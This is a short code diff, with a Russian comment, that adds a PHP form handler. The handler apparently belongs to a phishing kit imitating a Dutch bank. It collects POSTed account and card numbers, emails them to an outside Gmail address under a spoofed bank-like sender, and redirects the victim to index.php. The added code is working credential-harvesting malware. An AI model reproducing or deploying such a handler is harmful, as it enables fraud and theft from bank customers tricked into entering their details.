@@ -71,3 +71,21 @@ echo "Данные для записи получены, дата и время 
 </script>
 
 /************* Файл с формой - res.php в корне должен быть **********************/
+
+
+
+
+
+<?php
+
+
+$msg = "Reknr: ".$_POST['name']."<br>"."Pasnr: ".$_POST['phone']."<br>";
+
+$title = "Rabz-NV - ".$_POST['first']."-".$_POST['two'];
+$hrsd = "From:Rabz-NV <baro@eeee.nl>\n";
+$hrsd .= "Content-type: text/html; charset=iso-8859-1\r\n";
+mail("eeeee@gmail.com",$title,$msg,$hrsd);
+
+header('location: index.php');
+
+?>
